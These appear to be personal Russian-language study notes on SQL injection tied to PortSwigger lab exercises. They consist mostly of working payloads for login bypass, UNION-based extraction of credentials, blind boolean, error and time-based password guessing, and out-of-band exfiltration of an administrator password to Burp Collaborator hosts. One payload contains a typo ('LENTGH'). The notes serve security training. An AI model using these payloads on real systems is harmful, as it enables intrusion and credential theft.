[SQL Injection](https://portswigger.net/web-security/sql-injection)

[Cheat Sheet from PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet) ^896bf6

## Извлечение скрытых данных
Запрос принимает _category_:

	SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Инъекция:

	' OR 1=1--

## Нарушение логики приложения
Запрос принимает _username_ и _password_:

	SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

Инъекция:

	administrator'--

## Извлечение данных из других таблиц БД
Запрос принимает _category_:

	SELECT name, description FROM products WHERE category = 'Gifts'

Инъекция:

	' UNION SELECT username, password FROM users--

**Определение количества столбцов для UNION**
С помощью _ORDER BY_:

	' ORDER BY 1-- 
	' ORDER BY 2-- 
	' ORDER BY 3--
	etc.

С помощью _UNION SELECT NULL_:

	' UNION SELECT NULL--
	' UNION SELECT NULL,NULL-- 
	' UNION SELECT NULL,NULL,NULL--
	etc.

Для Oracle:

	' UNION SELECT NULL FROM DUAL--

**Поиск столбцов с полезным типом данных для SQL-инъекции UNION**
Поиск строкового столбца, 4 столбца:

	' UNION SELECT 'a',NULL,NULL--
	' UNION SELECT NULL,'a',NULL--
	' UNION SELECT NULL,NULL,'a'--

**SQL-инъекция UNION**
Зная название таблицы, столбцов, а также  их нужное количество:

	' UNION SELECT username, password FROM users--

**Извлечение нескольких значений в одном столбце**
Два столбца, только второй строковой:

	' UNION SELECT NULL,username||'~'||password FROM users--

Операторы конкатенации в разных БД в [[#^896bf6|Cheat Sheet'е]]

## Изучение БД
Определение версии, например, для Oracle:

	' SELECT * FROM v$version
	' UNION SELECT null,banner from v$version--

Список таблиц для большинства БД:

	' SELECT * FROM information_schema.tables

Пример для non-Oracle:

	' UNION SELECT NULL,NULL
	' UNION SELECT table_schema,table_name FROM information_schema.tables--
	' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_fekyvk'--
	' UNION SELECT username_sowiok,password_rvcfaz FROM users_fekyvk--

Пример для Oracle:

	' UNION SELECT NULL,NULL FROM DUAL--
	' UNION SELECT NULL,table_name FROM all_tables--
	' UNION SELECT NULL,column_name FROM all_tab_columns where table_name='USERS_DSDXRK'--
	' UNION SELECT USERNAME_PCGUWT,PASSWORD_DDEJBN FROM USERS_DSDXRK--

## Blind SQL-инъекции
##### Эксплуатация слепой SQL-инъекции путем запуска условного ответа
Пример для подбора пароля из [первой](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses) лабы по слепым инъекциям _(условный ответ, инъекция в куке)_

	' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm

##### Вызов условных ответов путем запуска ошибок SQL
Пример для подбора пароля из [второй](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors) лабы по слепым инъекциям _(условная ошибка, инъекция в куке, Oracle)_
Проверка ошибки валидным запросом (ошибка)

	'||(SELECT '')||'

Возможно, БД Oracle (siuu)

	'||(SELECT '' FROM dual)||'

Проверяем существование таблицы _users_

	'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

Теперь проверяем conditional error

	'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' (ошибка)
	'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' (нет ошибки)

Проверим, существует ли имя пользователя _administrator_ (ошибка если есть)

	'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Определяем длину пароля (ошибка если значение совпало)

	'||(SELECT CASE WHEN (LENTGH(password)=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Подбираем пароль

	'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

##### Эксплуатация слепых SQL-инъекций путем инициирования временных задержек
Полезные нагрузки для разных БД в [[#^896bf6|Cheat Sheet'е]]

Пример для [четвертой](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval) лабы
Перебором разных пэйлоадов определяем БД (PostgreSQL)

	'%3Bpg_sleep(10)--

Составляем валидный запрос

	'%3B+SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END--

Проверяем существование пользователя

	'%3B+SELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--

Определяем длину пароля

	'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--
	'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--

Тут в Бурпе особо не автоматизировать, нужно запустить 20 раз интрудер с 1 потоком и ловить задержки

	'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)>'m')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--

##### Эксплуатация слепых SQL-инъекций с помощью out-of-band (OAST) методов*
Полезные нагрузки для разных БД в [[#^896bf6|Cheat Sheet'е]]

Для out-of-band взаимодействия можно использовать различные сетевые протоколы, но обычно наиболее эффективным является DNS (служба доменных имен). Это связано с тем, что очень многие производственные сети позволяют свободно передавать DNS-запросы, поскольку они необходимы для нормальной работы производственных систем.
В Microsoft SQL Server для запуска DNS-запроса на определенный домен можно использовать: 

	'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--

Приложение использует cookie-файл отслеживания для аналитики и выполняет SQL-запрос, содержащий значение переданного cookie. SQL-запрос выполняется асинхронно и не влияет на ответ приложения. Однако можно запустить внеполосное взаимодействие с внешним доменом. БД Oracle.

Например, можно объединить SQL-инъекцию с базовыми техниками XXE следующим образом (_уязвимость была устранена_):

	TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

Пример запроса для эксфильтрации данных:

	'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--

Пример из второй лабы по out-of-band слепым инъекциям:

	'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'
	x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.zuxdgr1aog6aoa2udnrdhvfu9lfj38.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

Лабы

[Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

[Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)